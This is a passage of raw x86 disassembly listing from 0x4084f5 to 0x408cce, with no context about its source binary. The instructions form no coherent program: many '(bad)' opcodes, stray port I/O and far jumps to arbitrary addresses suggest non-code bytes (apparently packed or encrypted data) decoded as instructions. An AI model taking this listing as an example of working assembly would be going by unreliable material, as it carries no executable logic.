  4084f5:	jae    0x408532
  4084f7:	int3   
  4084f8:	xchg   esi,eax
  4084f9:	outs   dx,BYTE PTR ds:[esi]
  4084fa:	adc    al,0xe0
  4084fc:	xor    BYTE PTR [ecx+0xc6645da],al
  408502:	push   ebp
  408503:	xor    ebx,DWORD PTR [ebp-0x12]
  408506:	je     0x4084ba
  408508:	jno    0x408558
  40850a:	add    eax,0xb112688a
  40850f:	sbb    ch,0xb1
  408512:	loope  0x40858f
  408514:	imul   edx,esi,0x6b
  408517:	jnp    0x4084df
  408519:	test   BYTE PTR [esi],dl
  40851b:	test   DWORD PTR [eax+0x4d],ecx
  40851e:	jb     0x408599
  408520:	inc    ebx
  408521:	and    DWORD PTR [ebx-0x21dbdd7],ecx
  408527:	add    BYTE PTR [eax+edx*8+0x3c],bl
  40852b:	in     al,0x3a
  40852d:	jmp    0x53e20c1b
  408532:	jg     0x4084cc
  408534:	enter  0x7f30,0x6c
  408538:	pop    ecx
  408539:	shl    BYTE PTR [ebx],0x76
  40853c:	pop    edx
  40853d:	sbb    al,0x39
  40853f:	sbb    eax,0xd0178164
  408544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408545:	repz sahf 
  408547:	div    DWORD PTR [ebp-0x24]
  40854a:	pop    esp
  40854b:	sbb    BYTE PTR [ecx],dh
  40854d:	std    
  40854e:	xchg   ebp,eax
  40854f:	int3   
  408550:	pop    ss
  408551:	and    ax,0x111a
  408555:	stos   DWORD PTR es:[edi],eax
  408556:	jmp    DWORD PTR [eax+eax*2]
  408559:	fnstsw WORD PTR [ebx-0x35655e0]
  40855f:	jne    0x4084eb
  408561:	mov    bl,0xf
  408563:	retf   
  408564:	and    eax,0xf42eb2f3
  408569:	push   esp
  40856a:	imul   ebx,ecx,0xbd8e5340
  408570:	mov    al,ch
  408572:	das    
  408573:	xchg   esi,eax
  408574:	scas   eax,DWORD PTR es:[edi]
  408575:	std    
  408576:	pop    ss
  408577:	bts    DWORD PTR [esi+0x7c409845],ebp
  40857e:	ins    DWORD PTR es:[edi],dx
  40857f:	or     edi,DWORD PTR [edi]
  408581:	(bad)  
  408582:	out    dx,eax
  408583:	xor    eax,0xdd767ef5
  408588:	sti    
  408589:	xchg   ebx,eax
  40858a:	sbb    DWORD PTR [eax+0x135b71d5],0xffffffe1
  408591:	sub    BYTE PTR [ebx],0x52
  408594:	push   ss
  408595:	jmp    0x40859c
  408597:	xchg   ebp,eax
  408598:	xchg   eax,edx
  40859a:	push   ss
  40859b:	and    DWORD PTR [esi-0x2f],esi
  40859e:	jge    0x4085e9
  4085a0:	cmp    eax,edx
  4085a2:	out    0xe2,eax
  4085a4:	imul   eax,DWORD PTR [eax],0x17773212
  4085aa:	jl     0x4085ce
  4085ac:	cli    
  4085ad:	es dec dx
  4085b0:	mov    edi,0x5f159e81
  4085b5:	lods   al,BYTE PTR ds:[esi]
  4085b6:	pusha  
  4085b7:	xor    eax,0x671518aa
  4085bc:	dec    esp
  4085bd:	sbb    edi,edi
  4085bf:	imul   esi,esp,0x3d10ae8c
  4085c5:	push   ecx
  4085c6:	(bad)  
  4085c7:	out    0x62,al
  4085c9:	stc    
  4085ca:	push   esi
  4085cb:	jl     0x40862e
  4085cd:	add    BYTE PTR [esi+0x6a],cl
  4085d0:	(bad)  
  4085d1:	push   edi
  4085d2:	xor    DWORD PTR [edi],eax
  4085d4:	lahf   
  4085d5:	pop    ss
  4085d6:	xchg   ch,ch
  4085d8:	lock pop esp
  4085da:	sbb    ebp,ebx
  4085dc:	xchg   esi,eax
  4085dd:	ret    0xb5bf
  4085e0:	push   edx
  4085e1:	mov    al,0xd9
  4085e3:	sbb    bl,cl
  4085e5:	xchg   esp,eax
  4085e6:	in     eax,dx
  4085e7:	mov    DWORD PTR [esp+eax*1-0x2f7bac8e],esi
  4085ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ef:	inc    ebp
  4085f0:	aas    
  4085f1:	icebp  
  4085f2:	sti    
  4085f3:	pop    ebp
  4085f4:	push   ds
  4085f5:	push   0xffffff88
  4085f7:	mov    ecx,0xe375a4ef
  4085fc:	mov    esi,0xc49d4045
  408601:	mov    cl,0xd8
  408603:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408605:	in     eax,dx
  408606:	and    bh,BYTE PTR [ebp+0x5386c5ce]
  40860c:	ss inc esi
  40860e:	sahf   
  40860f:	fst    st(6)
  408611:	or     al,dl
  408613:	fist   WORD PTR [ebp+0x199b7851]
  408619:	jne    0xfe9afae
  40861f:	xchg   esi,eax
  408620:	cmp    ch,BYTE PTR [esp+edx*4+0x6b]
  408624:	clc    
  408625:	mov    WORD PTR [esi+0x2bc60ad0],fs
  40862b:	xor    cl,0xcb
  40862e:	lea    esp,[edi-0x7e9bca3]
  408634:	shl    BYTE PTR [ecx+0x53024ac],1
  40863a:	repnz cmp bl,dl
  40863d:	and    edi,DWORD PTR [ebp+0x180a27a3]
  408643:	retf   
  408644:	adc    eax,0xa39f8737
  408649:	aas    
  40864a:	inc    edi
  40864b:	jo     0x4086c1
  40864d:	cli    
  40864e:	adc    DWORD PTR [edx],esp
  408650:	add    DWORD PTR [ecx],0xffffff90
  408653:	jo     0x4086c0
  408655:	jne    0x4085e7
  408657:	cli    
  408658:	test   al,0x16
  40865a:	mov    edx,0x174c0d32
  40865f:	or     esi,ebp
  408661:	test   DWORD PTR [esi],ebx
  408663:	adc    al,0x35
  408665:	adc    edi,ecx
  408667:	lods   eax,DWORD PTR ds:[esi]
  408668:	push   ds
  408669:	sub    ch,dl
  40866b:	jne    0x4086d8
  40866d:	jno    0x4086eb
  40866f:	imul   ebp,DWORD PTR [ebx-0x2d],0x2670cf2
  408676:	cmp    BYTE PTR [ebx+0x7b322cd7],dl
  40867c:	popa   
  40867d:	(bad)  [ebp+0x5c83530e]
  408683:	pusha  
  408684:	jl     0x4086af
  408686:	jmp    0xd57a32e5
  40868b:	jmp    DWORD PTR ds:0x58e83fc2
  408691:	mov    al,ds:0x32c82
  408696:	cwde   
  408697:	pusha  
  408698:	inc    edi
  408699:	std    
  40869a:	(bad)  
  40869b:	adc    eax,0xe42ed5dc
  4086a0:	pushfw 
  4086a2:	call   0x14ad4bc9
  4086a7:	push   ebx
  4086a8:	ja     0x40863f
  4086aa:	push   ds
  4086ab:	cs cld 
  4086ad:	sub    esp,DWORD PTR [edx-0x57]
  4086b0:	das    
  4086b1:	aad    0xd1
  4086b3:	(bad)  
  4086b4:	popa   
  4086b5:	gs mov edx,0x2522fa00
  4086bb:	test   eax,0x914649ff
  4086c0:	mov    al,0xaf
  4086c2:	jp     0x4086a2
  4086c4:	rcr    DWORD PTR [edi+0x1c],cl
  4086c7:	xchg   DWORD PTR [ebp-0x14d1d872],ecx
  4086cd:	nop
  4086ce:	xchg   ebx,eax
  4086cf:	je     0x4086be
  4086d1:	ficomp WORD PTR [edi-0x26]
  4086d4:	xchg   ecx,eax
  4086d5:	push   es
  4086d6:	ins    BYTE PTR es:[edi],dx
  4086d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d8:	xor    edx,0x995c61c5
  4086de:	xchg   edx,eax
  4086df:	pop    ss
  4086e0:	loopne 0x408687
  4086e2:	push   edx
  4086e3:	mov    ebx,0xca35b722
  4086e8:	call   0xd9bdb9af
  4086ed:	(bad)  
  4086ee:	xchg   esp,eax
  4086ef:	push   cs
  4086f0:	jmp    0x4086b6
  4086f2:	out    dx,eax
  4086f3:	sti    
  4086f4:	cmp    al,0xe1
  4086f6:	shl    ebp,0x51
  4086f9:	data16 add al,0x44
  4086fc:	mov    esi,DWORD PTR [eax-0x43b7a929]
  408702:	push   esi
  408703:	and    edx,DWORD PTR [eax+eiz*4+0xe46357d]
  40870a:	mov    esi,0x55cebc1d
  40870f:	retf   0xeb3a
  408712:	fs ror dl,cl
  408715:	jl     0x4086a1
  408717:	outs   dx,BYTE PTR ds:[esi]
  408718:	jae    0x4086c7
  40871a:	push   0x78
  40871c:	in     eax,dx
  40871d:	icebp  
  40871e:	mov    edx,0x8de8cd8d
  408723:	in     al,0x94
  408725:	jle    0x40873b
  408727:	cmp    eax,0x1e0a2c41
  40872c:	ins    BYTE PTR es:[edi],dx
  40872d:	dec    ebp
  40872e:	daa    
  40872f:	fcomp  DWORD PTR [esi]
  408731:	stc    
  408732:	mov    eax,0x3e1bf79b
  408737:	data16 cmc 
  408739:	mov    bh,0xd1
  40873b:	int3   
  40873c:	jmp    0x408788
  40873e:	(bad)
  408741:	pop    ecx
  408742:	cmp    esp,DWORD PTR [ebp-0x70]
  408745:	scas   eax,DWORD PTR es:[edi]
  408746:	pop    ss
  408747:	ficom  DWORD PTR ds:0xe3bde5b7
  40874d:	fs xor eax,0x95356cf
  408753:	xchg   ebx,eax
  408754:	nop
  408755:	mov    eax,ds:0x872827dc
  40875a:	sbb    cl,BYTE PTR [eax+0x44]
  40875d:	add    DWORD PTR [ecx-0x3a],esi
  408760:	sub    eax,0x906b0dcf
  408765:	call   0xa4ba:0x7664a58d
  40876c:	push   esi
  40876d:	pop    eax
  40876e:	out    0x56,eax
  408770:	add    dh,BYTE PTR [ebx]
  408772:	aam    0x77
  408774:	mov    eax,0xfce26ebc
  408779:	loope  0x408720
  40877b:	jnp    0x40872c
  40877d:	mov    cl,0x96
  40877f:	xor    BYTE PTR [eax],0xb7
  408782:	pushf  
  408783:	call   0xe6715a11
  408788:	pop    ss
  408789:	fnstenv [esi+0x2e]
  40878c:	cli    
  40878d:	inc    si
  40878f:	and    ch,BYTE PTR [eax-0x6b1511cd]
  408795:	add    BYTE PTR [edi+0x45],ah
  408798:	push   edi
  408799:	adc    DWORD PTR [ebx+ebp*8-0x78],eax
  40879d:	inc    ebx
  40879e:	jmp    FWORD PTR [eax+ebp*8-0x1a060a49]
  4087a5:	out    dx,al
  4087a6:	hlt    
  4087a7:	jmp    eax
  4087a9:	add    BYTE PTR [ebx],bh
  4087ab:	mov    edx,0xa155b1ca
  4087b0:	rcr    BYTE PTR [ebx-0x35],0x1d
  4087b4:	outs   dx,BYTE PTR ds:[esi]
  4087b5:	mov    dl,0xe1
  4087b7:	xor    BYTE PTR [esi-0xa],al
  4087ba:	aam    0xce
  4087bc:	ss call 0x1b01:0x530e7a98
  4087c4:	or     al,cl
  4087c6:	aad    0xe7
  4087c8:	or     DWORD PTR [esi+ebx*4],ecx
  4087cb:	adc    edx,ecx
  4087cd:	sbb    BYTE PTR [ecx+0x10a3fa7e],bl
  4087d3:	cmp    al,dh
  4087d5:	push   edx
  4087d6:	and    ebp,ebp
  4087d8:	in     eax,dx
  4087d9:	std    
  4087da:	mov    ds:0x7865af58,eax
  4087df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087e0:	dec    ecx
  4087e1:	pop    edx
  4087e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087e3:	push   ebx
  4087e4:	mov    ebp,0xb78d977d
  4087e9:	fldenv [eax-0x68242651]
  4087ef:	mov    al,dl
  4087f1:	cs jmp 0x408843
  4087f4:	or     edx,DWORD PTR [esi]
  4087f6:	jp     0x4087e9
  4087f8:	dec    ecx
  4087f9:	pusha  
  4087fa:	lea    esp,[esp+ebp*1]
  4087fd:	dec    eax
  4087fe:	or     bh,BYTE PTR [ebx+eax*4]
  408801:	pop    eax
  408802:	mov    esi,0x35e56d47
  408807:	jle    0x4087f4
  408809:	mov    ebx,DWORD PTR [edi]
  40880b:	mov    bh,0x97
  40880d:	jns    0x4087cc
  40880f:	lods   eax,DWORD PTR ds:[esi]
  408810:	in     eax,dx
  408811:	fld    QWORD PTR [ebx-0x66354ce1]
  408817:	test   eax,0xcb052799
  40881c:	push   ds
  40881d:	sar    BYTE PTR [ecx+eax*2+0x4],cl
  408821:	dec    edx
  408822:	add    ebx,DWORD PTR cs:[ebp+0x3de3520c]
  408829:	xchg   ecx,eax
  40882a:	test   al,0x38
  40882c:	push   ebp
  40882d:	(bad)  
  40882f:	fist   WORD PTR [eax-0x38bbd516]
  408835:	add    BYTE PTR [esi+ebp*1+0x3546179d],bh
  40883c:	adc    al,0x61
  40883e:	fld    QWORD PTR [ebx]
  408840:	sub    ecx,0x2c
  408843:	sbb    esi,DWORD PTR [edx]
  408845:	cmp    BYTE PTR [esp+edx*4+0x641a9d7],ch
  40884c:	mov    ebp,0x3a6e902f
  408851:	int3   
  408852:	inc    esp
  408853:	shl    BYTE PTR [ecx+0x5eeb6f53],cl
  408859:	ja     0x408809
  40885b:	or     DWORD PTR [ebx],ecx
  40885d:	loop   0x4087ea
  40885f:	pop    ebp
  408860:	xchg   BYTE PTR [esi],al
  408862:	push   ecx
  408863:	xchg   esp,esp
  408865:	out    dx,al
  408866:	adc    BYTE PTR [edi],0x0
  408869:	in     al,dx
  40886a:	add    al,0x16
  40886c:	xor    BYTE PTR [eax-0x5a],bl
  40886f:	mov    DWORD PTR [esp+esi*1-0x3e220dfe],esi
  408876:	and    eax,0xf4f86e03
  40887b:	jae    0x4088d9
  40887d:	scas   al,BYTE PTR es:[edi]
  40887e:	ror    DWORD PTR [esi+ebp*2],0x4
  408882:	jp     0x408804
  408884:	inc    edi
  408885:	ror    ebp,0x81
  408888:	add    al,0xc2
  40888a:	ds sub al,0x7b
  40888d:	ss iret 
  40888f:	jbe    0x408827
  408891:	mov    dl,0xec
  408893:	and    DWORD PTR [ecx+0x49],eax
  408896:	sbb    ebx,eax
  408898:	or     al,0x86
  40889a:	push   edi
  40889b:	and    dh,BYTE PTR [edi-0x45047d1d]
  4088a1:	jne    0x40889e
  4088a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a4:	adc    DWORD PTR [eax-0x4c],eax
  4088a7:	mov    al,0xdf
  4088a9:	add    bl,dh
  4088ab:	iret   
  4088ac:	mov    al,gs:0x1a5db0c0
  4088b2:	adc    cl,BYTE PTR [ecx-0x10b91b87]
  4088b8:	push   edi
  4088b9:	or     dl,cl
  4088bb:	fisttp WORD PTR [edi+ebx*2-0x4b]
  4088bf:	mov    ah,0x55
  4088c1:	push   edi
  4088c2:	adc    al,0x55
  4088c4:	loope  0x40884f
  4088c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088c7:	cld    
  4088c8:	imul   ecx,ecx,0x68e0049c
  4088ce:	loopne 0x40885b
  4088d0:	jno    0x4088c9
  4088d2:	xchg   esp,eax
  4088d3:	icebp  
  4088d4:	xchg   esi,eax
  4088d5:	in     al,0x97
  4088d7:	mov    dh,0xc2
  4088d9:	int3   
  4088da:	xchg   ebx,eax
  4088db:	fsubr  st,st(7)
  4088dd:	fldcw  WORD PTR [edx-0x2becc77f]
  4088e3:	pop    esp
  4088e4:	mov    ds:0x59c1820c,eax
  4088e9:	push   ebx
  4088ea:	sahf   
  4088eb:	push   ebx
  4088ec:	cmp    DWORD PTR [ebx+0x2124e44d],ebx
  4088f2:	sar    DWORD PTR [eax-0x250b6ffb],1
  4088f8:	lods   eax,DWORD PTR ds:[esi]
  4088f9:	ret    0x6c65
  4088fc:	sti    
  4088fd:	add    BYTE PTR [edi-0x53bf111e],ah
  408903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408904:	pop    esp
  408905:	fs mov dl,0xc5
  408908:	sti    
  408909:	shl    BYTE PTR [ebp-0x12],1
  40890c:	in     eax,0xb4
  40890e:	adc    eax,0xed9b745d
  408913:	test   al,0xe4
  408915:	test   eax,0xda30d7ae
  40891a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40891b:	fmul   DWORD PTR [ecx+eax*8+0x78]
  40891f:	or     al,0x21
  408921:	imul   edx,DWORD PTR [eax-0x5f],0xc5fdc65f
  408928:	arpl   di,dx
  40892a:	icebp  
  40892b:	push   esi
  40892c:	stc    
  40892d:	push   ebp
  40892e:	mov    ecx,0x6ec6609
  408933:	pushf  
  408934:	xchg   ecx,eax
  408935:	add    ebx,DWORD PTR [esi+esi*2]
  408938:	call   0xc796:0x323a08f1
  40893f:	call   0xddbf6610
  408944:	ins    BYTE PTR es:[edi],dx
  408945:	xchg   ebx,eax
  408946:	outs   dx,BYTE PTR ds:[esi]
  408947:	mov    bl,0xd9
  408949:	jo     0x408901
  40894b:	cwde   
  40894c:	mov    bh,0x28
  40894e:	dec    ebp
  40894f:	adc    al,0xe7
  408951:	je     0x4089be
  408953:	lods   eax,DWORD PTR ds:[esi]
  408954:	mov    cl,0xce
  408956:	std    
  408957:	daa    
  408958:	jecxz  0x40894c
  40895a:	int    0xac
  40895c:	adc    DWORD PTR [bp-0x528a],edi
  408961:	popf   
  408962:	add    DWORD PTR [esi+0x74d42655],ecx
  408968:	push   ebp
  408969:	arpl   dx,di
  40896b:	jmp    0x2e7f77fe
  408970:	push   cs
  408971:	mov    ds:0x790d8661,eax
  408976:	mov    eax,ds:0xe6ff6c44
  40897b:	sbb    eax,esp
  40897d:	or     DWORD PTR [esi],esp
  40897f:	xor    ecx,DWORD PTR [ebp-0x1f28bdf0]
  408985:	jp     0x4089a7
  408987:	jmp    0x1786:0x7625238b
  40898e:	adc    DWORD PTR [edi],esi
  408990:	int3   
  408991:	mov    dl,0xea
  408993:	mov    ecx,DWORD PTR ss:0xa3857e61
  40899a:	ds sub eax,0xa3039a17
  4089a0:	pop    ebx
  4089a1:	lea    ecx,[eax+0x2f76a9b6]
  4089a7:	adc    DWORD PTR [esi-0x590d8277],edx
  4089ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089ae:	cmc    
  4089af:	repz cmp DWORD PTR ss:[ebp-0x53],esp
  4089b4:	dec    esp
  4089b5:	test   BYTE PTR gs:[edi+edx*2],dh
  4089b9:	fisubr DWORD PTR [esi-0x16e51ed4]
  4089bf:	in     eax,dx
  4089c0:	enter  0x954f,0x6b
  4089c4:	gs aas 
  4089c6:	pop    ebp
  4089c7:	pop    esi
  4089c8:	call   0x886871b8
  4089cd:	sbb    ebp,DWORD PTR ds:0xfaebfb17
  4089d3:	adc    eax,esp
  4089d5:	int    0x99
  4089d7:	inc    esp
  4089d8:	dec    esi
  4089d9:	test   BYTE PTR [ebp-0x11],bh
  4089dc:	push   ecx
  4089dd:	mov    al,0x4c
  4089df:	popa   
  4089e0:	(bad)  
  4089e1:	js     0x4089e1
  4089e3:	clc    
  4089e4:	sbb    dh,BYTE PTR [eax-0x62]
  4089e7:	call   0x790cb92b
  4089ec:	js     0x408a5d
  4089ee:	add    bh,BYTE PTR ds:0x7a87d84f
  4089f4:	nop
  4089f5:	jo     0x408a1e
  4089f7:	pop    eax
  4089f8:	or     eax,0xa07f322c
  4089fd:	mov    dh,BYTE PTR [esi]
  4089ff:	sub    DWORD PTR [ecx+ebx*1],esp
  408a02:	pop    es
  408a03:	addr16 cmp ax,0xa3f3
  408a08:	dec    edx
  408a09:	ins    BYTE PTR es:[edi],dx
  408a0a:	rol    DWORD PTR [ecx-0x50c2694e],cl
  408a10:	lds    ecx,FWORD PTR [ecx+0x37]
  408a13:	push   ecx
  408a14:	sbb    eax,0x54535cf8
  408a19:	sbb    BYTE PTR [ecx-0x210ae0d1],ah
  408a1f:	inc    ebx
  408a20:	xchg   edi,eax
  408a21:	pop    edi
  408a22:	into   
  408a23:	sbb    dh,dl
  408a25:	xlat   BYTE PTR ds:[ebx]
  408a26:	sub    esp,ebp
  408a28:	mov    eax,fs
  408a2a:	lods   eax,DWORD PTR ds:[esi]
  408a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a2c:	mov    dh,0xa3
  408a2e:	jmp    0x408a4f
  408a30:	cmp    esi,eax
  408a32:	scas   al,BYTE PTR es:[edi]
  408a33:	adc    esp,DWORD PTR [eax]
  408a35:	jle    0x408a06
  408a37:	inc    ebx
  408a38:	cmp    esp,DWORD PTR [ebp-0x39ee2bdc]
  408a3e:	aam    0x72
  408a40:	fs or  eax,0xf99e28d3
  408a46:	sub    eax,0xb911698c
  408a4b:	movhps xmm3,QWORD PTR [edi+0x4544fd76]
  408a52:	xor    edi,DWORD PTR ds:0xb561d79f
  408a58:	retf   0x93e6
  408a5b:	xchg   ecx,eax
  408a5c:	sti    
  408a5d:	clc    
  408a5e:	sbb    edi,DWORD PTR [edi-0x6e]
  408a61:	push   edi
  408a62:	rol    BYTE PTR [ecx-0x6d],0xad
  408a66:	jmp    0x2291:0x72ba308c
  408a6d:	mov    ebx,0xa89a4aee
  408a72:	pop    ecx
  408a73:	lock lock test DWORD PTR [ebp+eiz*4-0x55],edi
  408a79:	scas   al,BYTE PTR es:[edi]
  408a7a:	sbb    al,BYTE PTR [ebp+ebx*8-0x23]
  408a7e:	outs   dx,DWORD PTR ds:[esi]
  408a7f:	ja     0x408ad1
  408a81:	pushf  
  408a82:	fldcw  WORD PTR [ebp+0x15d92cef]
  408a88:	and    al,0x57
  408a8a:	pop    ebp
  408a8b:	repnz sti 
  408a8d:	or     al,0xf9
  408a8f:	mov    al,0xd9
  408a91:	jle    0x408af4
  408a93:	pop    ss
  408a94:	aam    0xa6
  408a96:	mov    eax,ds:0xf2169230
  408a9b:	mov    edx,0x16a3f5b0
  408aa0:	dec    eax
  408aa1:	in     al,dx
  408aa2:	sbb    BYTE PTR [edi-0x50],0x3e
  408aa6:	cwde   
  408aa7:	jno    0x408b06
  408aa9:	popf   
  408aaa:	adc    DWORD PTR [ecx-0x20],esi
  408aad:	ficomp DWORD PTR [ebx+ecx*4-0x2d]
  408ab1:	and    dh,BYTE PTR [ecx+0x60]
  408ab4:	inc    esi
  408ab5:	pop    esp
  408ab6:	sbb    al,0x10
  408ab8:	gs out 0xeb,eax
  408abb:	jmp    0xea77:0x13be15c0
  408ac2:	mov    cl,0xef
  408ac4:	sub    ebx,DWORD PTR [ecx+0x5a186f00]
  408aca:	mov    ds:0xdbb1426,eax
  408acf:	test   al,0x46
  408ad1:	gs in  eax,0xbd
  408ad4:	push   esi
  408ad5:	sahf   
  408ad6:	js     0x408b17
  408ad8:	jno    0x408a70
  408ada:	repz cmp BYTE PTR [eax+0x4b],dl
  408ade:	imul   edi,DWORD PTR [esp+edi*4-0xd77c2a0],0xffffffc2
  408ae6:	(bad)  
  408ae7:	mov    edx,DWORD PTR [ebp+eax*4+0x72]
  408aeb:	ins    BYTE PTR es:[edi],dx
  408aec:	sbb    BYTE PTR [eax+0x25ba0846],dh
  408af2:	and    DWORD PTR [ebp-0x62f1c3],edi
  408af8:	cmp    al,dl
  408afa:	jnp    0x408b66
  408afc:	pop    ss
  408afd:	inc    esi
  408afe:	int3   
  408aff:	imul   ebp,DWORD PTR [edx],0x14
  408b02:	jns    0x408b13
  408b04:	jo     0x408aae
  408b06:	js     0x408b84
  408b08:	sbb    esp,eax
  408b0a:	ss gs psrad mm0,QWORD PTR cs:[eax]
  408b10:	inc    edi
  408b11:	aas    
  408b12:	jmp    0x8206:0xe2c97d9b
  408b19:	les    esp,FWORD PTR [edx-0xc]
  408b1c:	retf   0x52d3
  408b1f:	test   eax,0xa77ec28d
  408b24:	cwde   
  408b25:	xchg   esp,eax
  408b26:	out    dx,eax
  408b27:	push   es
  408b28:	loopne 0x408b30
  408b2a:	jmp    0xe95ce839
  408b2f:	pop    ebp
  408b30:	in     al,dx
  408b31:	cmp    al,0xb9
  408b33:	pop    esi
  408b34:	inc    edi
  408b35:	ins    BYTE PTR es:[edi],dx
  408b36:	in     eax,dx
  408b37:	sbb    BYTE PTR [esi+0x607570e2],0xdf
  408b3e:	pop    ebp
  408b3f:	push   ecx
  408b40:	sub    cl,BYTE PTR [eax+0x2b771d32]
  408b46:	retf   
  408b47:	std    
  408b48:	inc    esi
  408b49:	xchg   edi,eax
  408b4a:	mov    ss,WORD PTR ds:0x29aa29f
  408b50:	jb     0x408b05
  408b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b53:	ins    DWORD PTR es:[edi],dx
  408b54:	xchg   esi,eax
  408b55:	jae    0x408b1f
  408b57:	push   eax
  408b58:	jb     0x408ba8
  408b5a:	adc    DWORD PTR [ecx+0x13],edx
  408b5d:	push   edi
  408b5e:	and    edi,DWORD PTR [ecx+esi*4-0x1b8c9200]
  408b65:	loope  0x408bb6
  408b67:	mov    cl,0x19
  408b69:	mov    edx,0x346b0e31
  408b6e:	dec    esp
  408b6f:	mov    dl,0xd9
  408b71:	inc    ebx
  408b72:	and    DWORD PTR [esi],ebp
  408b74:	fiadd  DWORD PTR [ebx+0x8]
  408b77:	jle    0x408bde
  408b79:	and    BYTE PTR [edi+0x5e],bh
  408b7c:	das    
  408b7d:	icebp  
  408b7e:	rcr    DWORD PTR [edi],1
  408b80:	(bad)  
  408b81:	out    dx,eax
  408b82:	in     eax,dx
  408b83:	add    al,dl
  408b85:	jl     0x408bc0
  408b87:	rcl    DWORD PTR ds:0x44c66ceb,cl
  408b8d:	xchg   bl,cl
  408b8f:	enter  0x2368,0x96
  408b93:	inc    esp
  408b94:	cmp    BYTE PTR [edx*8+0x465f76cd],dh
  408b9b:	loope  0x408b78
  408b9d:	cmp    ecx,DWORD PTR [edi]
  408b9f:	scas   eax,DWORD PTR es:[edi]
  408ba0:	bound  eax,QWORD PTR [esi]
  408ba2:	mov    ds:0x3b31f663,al
  408ba7:	stc    
  408ba8:	sub    esi,DWORD PTR [ecx+eax*2-0x42]
  408bac:	adc    al,0xe7
  408bae:	pop    esp
  408baf:	lock nop
  408bb1:	mov    ds:0x5ca0133a,eax
  408bb6:	into   
  408bb7:	scas   eax,DWORD PTR es:[edi]
  408bb8:	lods   al,BYTE PTR ds:[esi]
  408bb9:	inc    esi
  408bba:	mov    bh,0xae
  408bbc:	sbb    BYTE PTR [ecx+0x75018625],al
  408bc2:	pop    eax
  408bc3:	or     eax,0xf0ad0910
  408bc8:	pop    ds
  408bc9:	stos   DWORD PTR es:[edi],eax
  408bca:	(bad)  
  408bcb:	icebp  
  408bcc:	inc    eax
  408bcd:	popf   
  408bce:	and    eax,0x86ca7a5
  408bd3:	or     eax,0x8b3cdf9a
  408bd8:	pop    edi
  408bd9:	push   esi
  408bda:	(bad)  
  408bdc:	mov    cl,0xf5
  408bde:	xchg   ebp,eax
  408bdf:	loope  0x408c1a
  408be1:	(bad)  
  408be2:	repz pop ebp
  408be4:	gs out 0x36,al
  408be7:	out    dx,eax
  408be8:	sti    
  408be9:	inc    ebp
  408bea:	fwait
  408beb:	rcr    BYTE PTR [edi+0x839f841],cl
  408bf1:	and    eax,0x4cbc9a31
  408bf6:	shr    ch,1
  408bf8:	in     al,dx
  408bf9:	js     0x408bc0
  408bfb:	cld    
  408bfc:	push   0x9627964d
  408c01:	push   cs
  408c02:	jb     0x408bd6
  408c04:	test   DWORD PTR [ebp+0x16c7f377],0xbfca4809
  408c0e:	mov    dl,0xf7
  408c10:	xor    eax,0x81ebe2dd
  408c15:	lods   al,BYTE PTR ds:[esi]
  408c16:	inc    ebp
  408c17:	mov    ecx,ss
  408c19:	dec    edx
  408c1a:	mov    ds:0xadfff058,eax
  408c1f:	test   eax,0xf70755b3
  408c24:	ret    
  408c25:	cld    
  408c26:	mov    edi,0xa11da200
  408c2b:	add    edx,DWORD PTR [esi+ecx*2+0x22d07bff]
  408c32:	jae    0x408c25
  408c34:	mov    ah,0xdf
  408c36:	ins    DWORD PTR es:[edi],dx
  408c37:	lea    ebp,[esi+0x320653cd]
  408c3d:	xor    BYTE PTR fs:[ecx],ah
  408c40:	inc    bx
  408c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c43:	div    BYTE PTR [eax+edx*4-0x4b0478f0]
  408c4a:	pop    esp
  408c4b:	nop
  408c4c:	add    al,0x7f
  408c4e:	push   ss
  408c4f:	xchg   ebx,eax
  408c50:	jp     0x408bec
  408c52:	(bad)  
  408c53:	push   esi
  408c54:	mov    esi,0xe2995a2f
  408c59:	mov    bl,0xad
  408c5b:	imul   ecx,DWORD PTR [ebx+0x31],0x40960cd1
  408c62:	inc    ebp
  408c63:	sbb    al,BYTE PTR [eax+ebx*2+0xf]
  408c67:	loopne 0x408cba
  408c69:	xor    DWORD PTR [esi],0xfc245f51
  408c6f:	sbb    eax,0xaa4fe633
  408c74:	push   ss
  408c75:	pop    ebx
  408c76:	aaa    
  408c77:	and    eax,0xd654c280
  408c7c:	test   esi,ecx
  408c7e:	(bad)  
  408c7f:	push   esi
  408c80:	in     al,dx
  408c81:	push   ds
  408c82:	adc    BYTE PTR [edi+0x58d8af67],ah
  408c88:	push   esi
  408c89:	and    DWORD PTR [ebx],esp
  408c8b:	sub    eax,0x29758e
  408c90:	ficom  DWORD PTR [ecx+0x336cb2c3]
  408c96:	pop    esp
  408c97:	pop    eax
  408c98:	pop    ecx
  408c99:	hlt    
  408c9a:	xor    BYTE PTR [ebp+0x7a],bh
  408c9d:	xor    eax,0x91b2f558
  408ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca3:	scas   eax,DWORD PTR es:[edi]
  408ca4:	je     0x408cc6
  408ca6:	outs   dx,DWORD PTR ds:[esi]
  408ca7:	adc    al,0xf8
  408ca9:	mov    esp,0x6d36d32c
  408cae:	cmp    edi,DWORD PTR [esi+ebp*4+0x60]
  408cb2:	cmp    BYTE PTR [esi-0x16511cb0],ch
  408cb8:	sub    al,0x70
  408cba:	jns    0x408cda
  408cbc:	push   cs
  408cbd:	mul    ecx
  408cbf:	mov    al,ds:0xbe6ee07a
  408cc4:	cmp    al,cl
  408cc6:	cld    
  408cc7:	jle    0x408c7a
  408cc9:	pusha  
  408cca:	xlat   BYTE PTR ds:[ebx]
  408ccb:	xchg   ebx,eax
  408ccc:	adc    BYTE PTR [edi],ch
  408cce:	add    DWORD PTR [esi-0x42435769],eax
